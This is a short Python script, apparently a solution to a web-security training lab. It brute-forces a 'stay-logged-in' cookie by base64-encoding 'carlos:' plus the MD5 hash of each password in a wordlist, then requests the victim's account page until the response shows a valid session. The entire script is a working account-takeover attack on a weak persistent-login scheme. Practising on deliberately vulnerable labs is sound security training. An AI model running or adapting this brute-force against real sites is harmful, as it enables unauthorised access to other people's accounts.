import requests
import os
from hashlib import md5
from base64 import b64encode

def get_password_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    passwords_path = os.path.join(parent_dir, '../wordlists', 'passwords.txt')
    with open(passwords_path, 'r') as f:
        return f.read().splitlines()
    


passwords = get_password_wordlist()
LAB_URL = input("Enter the lab URL: ")

# res = md5('peter'.encode())
# payload = f"wiener:{res.hexdigest()}"
# b64_payload = b64encode(payload.encode()).decode()

for password in passwords:
    md5_hash = md5(password.encode()).hexdigest()
    payload = f"carlos:{md5_hash}"
    b64_payload = b64encode(payload.encode()).decode()
    headers = {
        "Cookie": f"stay-logged-in={b64_payload}"
    }

    r = requests.get(f"{LAB_URL}/my-account?id=carlos", headers=headers)
    if "Your username is: carlos" in r.text:
        print(f"Found valid session: {b64_payload}")
        break